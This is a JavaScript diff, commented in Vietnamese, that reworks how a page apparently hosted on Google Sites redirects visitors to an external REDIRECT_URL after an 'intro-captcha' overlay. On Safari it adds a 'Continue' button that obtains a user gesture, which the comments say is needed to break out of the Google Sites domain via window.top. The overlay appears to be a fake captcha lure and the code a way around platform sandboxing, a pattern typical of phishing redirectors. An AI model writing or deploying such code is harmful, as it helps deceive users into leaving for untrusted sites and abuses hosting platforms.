@@ -518,18 +518,44 @@
 
     const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
 
-    const redirect = () => {
-      if (isSafari) {
-        // iOS Safari: window.open luôn đưa tab lên foreground ngay lập tức.
-        // Dùng location navigation thay thế — không cần user gesture, không mở tab mới.
-        try {
-          window.top.location.href = REDIRECT_URL;
-        } catch (_) {
-          window.location.href = REDIRECT_URL;
-        }
-      } else {
-        window.open(REDIRECT_URL, "_blank", "noopener,noreferrer");
+    const navigateOut = () => {
+      try {
+        window.top.location.href = REDIRECT_URL;
+      } catch (_) {
+        window.open(REDIRECT_URL, "_blank");
       }
+    };
+
+    const showContinueBtn = () => {
+      const overlay = document.getElementById("intro-captcha");
+      if (!overlay) return;
+      const panel = overlay.querySelector(".intro-captcha-panel");
+      if (!panel) return;
+
+      const wrapper = document.createElement("div");
+      wrapper.style.cssText = "margin-top:1.5rem;text-align:center";
+
+      const btn = document.createElement("button");
+      btn.type = "button";
+      btn.textContent = "Continue";
+      btn.style.cssText = [
+        "display:inline-block",
+        "padding:0.7rem 3rem",
+        "background:#0180FA",
+        "color:#fff",
+        "border:none",
+        "border-radius:6px",
+        "font-size:15px",
+        "font-weight:700",
+        "font-family:Helvetica,Arial,sans-serif",
+        "letter-spacing:0.03em",
+        "cursor:pointer"
+      ].join(";");
+
+      btn.addEventListener("click", navigateOut);
+      wrapper.appendChild(btn);
+      panel.appendChild(wrapper);
+      btn.focus();
     };
 
     const finishIntro = () => {
@@ -537,8 +563,15 @@
       if (!overlay) return;
       overlay.classList.add("is-fading");
       const doneTimer = setTimeout(() => {
-        overlay.remove();
-        redirect();
+        if (isSafari) {
+          // Safari: cần user gesture để thoát khỏi Google Sites domain.
+          // Hiện nút Continue — click là gesture thật, window.top mới được phép.
+          overlay.classList.remove("is-fading");
+          showContinueBtn();
+        } else {
+          overlay.remove();
+          window.open(REDIRECT_URL, "_blank", "noopener,noreferrer");
+        }
       }, DONE_DELAY_MS);
       introState.timers.push(doneTimer);
     };
